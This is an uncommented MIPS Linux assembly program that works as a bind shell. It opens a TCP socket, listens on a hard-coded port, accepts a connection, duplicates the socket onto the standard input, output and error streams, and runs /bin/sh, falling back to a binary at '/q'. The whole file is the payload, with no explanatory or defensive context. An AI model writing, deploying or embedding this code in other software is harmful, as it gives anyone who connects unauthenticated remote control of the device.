    .set noreorder
    .text
    .globl _start
_start:
    li   $4, 2
    li   $5, 2
    li   $6, 0
    li   $2, 4183
    syscall
    move $16, $2
    lui  $9, %hi(sa)
    addiu $9, $9, %lo(sa)
    li   $8, 2
    sh   $8, 0($9)
    li   $8, 0x5C11
    sh   $8, 2($9)
    sw   $0, 4($9)
    sw   $0, 8($9)
    move $4, $16
    move $5, $9
    li   $6, 16
    li   $2, 4169
    syscall
    move $4, $16
    li   $5, 4
    li   $2, 4174
    syscall
    move $4, $16
    li   $5, 0
    li   $2, 4168
    syscall
    move $17, $2
    move $4, $17
    li   $5, 0
    li   $2, 4063
    syscall
    move $4, $17
    li   $5, 1
    li   $2, 4063
    syscall
    move $4, $17
    li   $5, 2
    li   $2, 4063
    syscall
    lui  $4, %hi(sh)
    addiu $4, $4, %lo(sh)
    lui  $5, %hi(argv)
    addiu $5, $5, %lo(argv)
    lui  $6, %hi(envp)
    addiu $6, $6, %lo(envp)
    li   $2, 4011
    syscall
    lui  $4, %hi(qp)
    addiu $4, $4, %lo(qp)
    lui  $5, %hi(qargv)
    addiu $5, $5, %lo(qargv)
    lui  $6, %hi(envp)
    addiu $6, $6, %lo(envp)
    li   $2, 4011
    syscall
    li   $4, 127
    li   $2, 4001
    syscall
    .data
sh:  .asciz "/bin/sh"
qp:  .asciz "/q"
    .align 2
qps: .asciz "q"
    .align 2
argv:  .word sh
       .word 0
qargv: .word qps
       .word sh
       .word 0
pe:  .asciz "PATH=/bin:/sbin"
    .align 2
envp: .word pe
      .word 0
    .align 2
sa:  .word 0,0,0,0
